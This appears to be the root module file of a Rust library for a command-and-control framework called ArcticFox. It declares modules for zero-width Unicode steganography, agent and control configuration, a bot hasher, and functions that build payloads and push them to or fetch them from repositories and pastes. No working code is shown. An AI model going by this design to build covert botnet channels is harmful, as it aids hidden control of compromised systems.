//! ArcticFox C3 Core Library
//!
//! Foundation crate providing:
//! - Zero-width Unicode steganography codec
//! - Configuration types (agent, control, API)
//! - Cryptographic utilities (ring-based)
//! - Common error types and helpers
//! - Repository abstraction layer

pub mod config;
pub mod crypto;
pub mod error;
pub mod fbi;
pub mod repo;
pub mod zwcodec;

/// Prelude: commonly used types
pub mod prelude {
    pub use crate::config::{AgentConfig, ApiConfig, ControlConfig, RepoTarget, RepoSource};
    pub use crate::crypto::{generate_token, secure_hash_eq, BotHasher};
    pub use crate::error::{ArcticFoxError, Result};
    pub use crate::repo::{build_payload, check_repo_alive, fetch_readme, push_to_repo, DebianPaste};
    pub use crate::zwcodec::{decode, encode, extract, inject, strip, ZW_PAD_TARGET};
}
